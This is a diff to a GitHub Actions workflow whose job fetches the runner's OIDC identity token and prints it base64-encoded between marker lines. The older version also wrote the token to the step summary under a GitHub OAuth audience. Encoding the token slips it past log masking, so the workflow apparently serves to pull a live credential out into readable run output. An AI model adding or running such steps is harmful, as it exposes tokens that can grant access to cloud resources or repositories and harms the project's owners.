@@ -10,19 +10,10 @@ jobs:
   get-oidc-token:
     runs-on: ubuntu-latest
     steps:
-      - name: Get OIDC Token (Base64 - audience matched)
+      - name: Get fresh OIDC JWT
         run: |
-          TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://github.com/login/oauth" | jq -r '.value')
-          echo "===OIDC_B64_START==="
-          echo "$TOKEN" | base64 -w0
-          echo ""
-          echo "===OIDC_B64_END==="
-      
-      - name: Output to summary
-        run: |
-          TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://github.com/login/oauth" | jq -r '.value')
+          TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL" | jq -r '.value')
           B64=$(echo "$TOKEN" | base64 -w0)
-          echo "## OIDC JWT Token (Base64 - audience: github.com/login/oauth)" >> $GITHUB_STEP_SUMMARY
-          echo '\`\`\`' >> $GITHUB_STEP_SUMMARY
-          echo "$B64" >> $GITHUB_STEP_SUMMARY
-          echo '\`\`\`' >> $GITHUB_STEP_SUMMARY
+          echo "===B64_START==="
+          echo "$B64"
+          echo "===B64_END==="
